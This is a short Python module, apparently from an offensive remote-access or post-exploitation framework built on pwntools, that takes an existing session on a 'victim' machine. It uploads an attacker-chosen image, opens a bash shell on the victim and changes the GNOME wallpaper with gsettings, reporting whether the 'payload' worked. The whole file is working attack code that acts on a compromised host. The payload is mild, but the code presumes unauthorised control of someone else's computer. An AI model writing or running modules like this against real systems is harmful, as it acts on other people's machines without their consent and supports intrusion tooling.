#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs):
    if session.which("gsettings") == None:
        print(cs.error, "Victim does not have dependency: gsettings")
        return 1

    image = input(cs.status + " Enter the location of the image: ")
    session.upload_file(image, "/tmp/wallpaper")

    shell = session.process("/bin/bash")
    print(cs.status, "Changing wallpaper...")
    shell.sendline("(gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper) || echo payloadfailed")
    if str(shell.recvrepeat(0.2), "UTF-8").find("payloadfailed") == -1:
        print(cs.good, "Successfully changed wallpaper")
        shell.close()
        return 0
    else:
        print(cs.error, "Failed to change wallpaper")
        shell.close()
        return 1
